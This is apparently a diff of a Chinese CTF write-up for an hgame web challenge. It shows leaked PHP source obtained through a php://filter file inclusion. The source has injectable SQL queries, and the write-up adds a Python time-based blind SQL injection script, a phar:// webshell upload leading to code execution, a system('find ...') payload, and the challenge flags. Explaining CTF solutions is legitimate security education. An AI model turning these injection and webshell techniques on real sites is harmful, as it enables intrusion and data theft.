-<p>审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入<code>$sql_query = “delete from <code>messages</code> where <code>message_id</code>=$message_id and <code>user_id</code>=$user_id”;</code>，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"groups"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:<span class="string">"c419fq3ppu11r1o2tra4l9rlnm"</span>,</span><br><span class="line">    <span class="string">"user"</span>:<span class="string">"snowtest"</span></span><br><span class="line">&#125;</span><br><span class="line">url_del = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class="line">url = <span class="string">'http://111.231.140.29:10080/index.php?action=message'</span></span><br><span class="line">message = <span class="string">"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#"</span></span><br><span class="line">avatar = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">127</span>):</span><br><span class="line">        r = requests.get(url,cookies=cookies)</span><br><span class="line">        token = re.findall(<span class="string">r"value='(.*)' id='token'&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        data = dict(token=token,message_id=message.format(i,j))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url_del,cookies=cookies,data=data,timeout=<span class="number">4</span>)  </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            avatar += chr(j)</span><br><span class="line">            print(avatar)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p>可以得到我的账号对应的文件名为<code>1bce72251d3c333</code>，在upload_avatar()中会在文件名后面强行拼接png后缀<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);</code>，也就是最终上传的文件名会被命名为<code>1bce72251d3c333.png</code>，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了<code>require $page .&#39;.php&#39;;</code>，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传</p>
-<p><img src="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png" alt=""><br>然后上传，之后访问<code>http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell</code>即可getshell</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="基础渗透">
+          <a href="#基础渗透" class="heading-link"><i class="fas fa-link"></i></a>基础渗透</h2>
+      <p>正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有<code>action=message</code>，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.231.140.29:10080&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></div></figure>
+<p>得到源码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/header.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (is_null($_SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location:/login.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$page = array_key_exists(<span class="string">'action'</span>, $_GET) ? $_GET[<span class="string">'action'</span>] : <span class="string">'message'</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/footer.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure></p>
+<p>functions.php<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set("display_errors", "on");</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span><span class="params">($sql_query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_token</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $token = <span class="string">''</span>;</span><br><span class="line">    $chars = str_split(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">48</span>; $i++) &#123;</span><br><span class="line">        $token = $token . $chars[random_int(<span class="number">0</span>, <span class="number">61</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'token'</span>] = $token;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;input type='hidden' value='$token' id='token'&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">res_to_json</span><span class="params">($res, $type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $json[<span class="string">'type'</span>] = $type;</span><br><span class="line">    $json[<span class="string">'status'</span>] = <span class="string">"true"</span>;</span><br><span class="line">    $json[<span class="string">"content"</span>] = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $message) &#123;</span><br><span class="line"></span><br><span class="line">        $array_tmp[<span class="string">'user_id'</span>] = $message[<span class="string">'user_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'user'</span>] = $message[<span class="string">'user'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'avatar'</span>] = get_avatar($message[<span class="string">'user_id'</span>]) != <span class="keyword">null</span> ? get_avatar($message[<span class="string">'user_id'</span>])[<span class="string">'content'</span>] : md5($message[<span class="string">'user'</span>]);</span><br><span class="line">        $array_tmp[<span class="string">'message'</span>] = $message[<span class="string">'content'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'message_id'</span>] = $message[<span class="string">'message_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'time'</span>] = $message[<span class="string">'date'</span>];</span><br><span class="line">        array_push($json[<span class="string">"content"</span>], $array_tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    $json[<span class="string">"content"</span>] = $json[<span class="string">"content"</span>];</span><br><span class="line">    <span class="keyword">return</span> json_encode($json);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">($username, $password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (strlen($password) &lt; <span class="number">6</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($username, $password) == <span class="number">1</span> <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"insert into `users`(`username`,`password`) VALUES ('$username','$password')"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'register success!'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"select * from `users` where `username`='$username' and `password`='$password'"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">            $data = $res-&gt;fetch_array();</span><br><span class="line">            $_SESSION[<span class="string">'user_id'</span>] = $data[<span class="string">'user_id'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'user'</span>] = $data[<span class="string">'username'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'groups'</span>] = $data[<span class="string">'groups'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            setcookie(<span class="string">'user'</span>, $_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">            setcookie(<span class="string">'groups'</span>, $_SESSION[<span class="string">'groups'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loginout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'loginout'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">        setcookie(<span class="string">'groups'</span>, <span class="keyword">null</span>);</span><br><span class="line">        setcookie(<span class="string">'user'</span>, <span class="keyword">null</span>);</span><br><span class="line">        Header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_avatar</span><span class="params">($user_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">    $res = sql_query($sql_query)-&gt;fetch_row()[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $res, <span class="string">'content'</span> =&gt; base64_encode(file_get_contents(<span class="string">'./img/avatar/'</span> . $res . <span class="string">'.png'</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_new_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span><span class="params">($message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> mb_strlen($message) &gt; <span class="number">6</span>) &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $user = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">            $sql_query = <span class="string">"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"login error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"length error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span><span class="params">($message_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `avatar`=$tmp"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_avatar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'image/gif'</span> || $type == <span class="string">'image/jpeg'</span> || $type == <span class="string">'image/png'</span>) &#123;</span><br><span class="line">        $avatar = get_avatar($user_id);</span><br><span class="line">        <span class="keyword">if</span> ($avatar == <span class="keyword">null</span>) &#123;</span><br><span class="line">            $name = rand_filename();</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $name . <span class="string">".png"</span>);</span><br><span class="line">            $sql_query = <span class="string">"update `users` set `avatar`='$name' WHERE `user_id`=$user_id"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $avatar[<span class="string">'name'</span>] . <span class="string">".png"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_password</span><span class="params">($opassword, $npassword, $npasswod_again)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($_SESSION[<span class="string">'user'</span>], $npassword)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($npasswod_again !== $npassword) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"difference error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $sql_query = <span class="string">"select `password` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">            $res = sql_query($sql_query);</span><br><span class="line">            <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($res-&gt;fetch_row()[<span class="number">0</span>] === md5($opassword)) &#123;</span><br><span class="line">                    $sql_query = <span class="string">"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id"</span>;</span><br><span class="line">                    $res = sql_query($sql_query);</span><br><span class="line">                    <span class="keyword">echo</span> $res;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"oldpassword error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p>
+<p>审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入<code>$sql_query = “delete from <code>messages</code> where <code>message_id</code>=$message_id and <code>user_id</code>=$user_id”;</code>，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"groups"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:<span class="string">"c419fq3ppu11r1o2tra4l9rlnm"</span>,</span><br><span class="line">    <span class="string">"user"</span>:<span class="string">"snowtest"</span></span><br><span class="line">&#125;</span><br><span class="line">url_del = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class="line">url = <span class="string">'http://111.231.140.29:10080/index.php?action=message'</span></span><br><span class="line">message = <span class="string">"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#"</span></span><br><span class="line">avatar = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">127</span>):</span><br><span class="line">        r = requests.get(url,cookies=cookies)</span><br><span class="line">        token = re.findall(<span class="string">r"value='(.*)' id='token'&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        data = dict(token=token,message_id=message.format(i,j))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url_del,cookies=cookies,data=data,timeout=<span class="number">4</span>)  </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            avatar += chr(j)</span><br><span class="line">            print(avatar)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure><br>可以得到我的账号对应的文件名为<code>1bce72251d3c333</code>，在upload_avatar()中会在文件名后面强行拼接png后缀<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);</code>，也就是最终上传的文件名会被命名为<code>1bce72251d3c333.png</code>，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了<code>require $page .&#39;.php&#39;;</code>，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传</p>
+<p><img src="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png" alt><br>然后上传，之后访问<code>http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell</code>即可getshell</p>
 <p>然后就是文件探测了，可以使用find命令<code>snow=system(&#39;find / -name &quot;*flag*&quot;&#39;);</code>，最终payload</p>
-<p><img src="https://i.loli.net/2019/02/19/5c6bde110e9a2.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="BabyXss"><a href="#BabyXss" class="headerlink" title="BabyXss"></a>BabyXss</h2><p>题目环境有点问题</p>
+<p><img src="https://i.loli.net/2019/02/19/5c6bde110e9a2.png" alt></p>
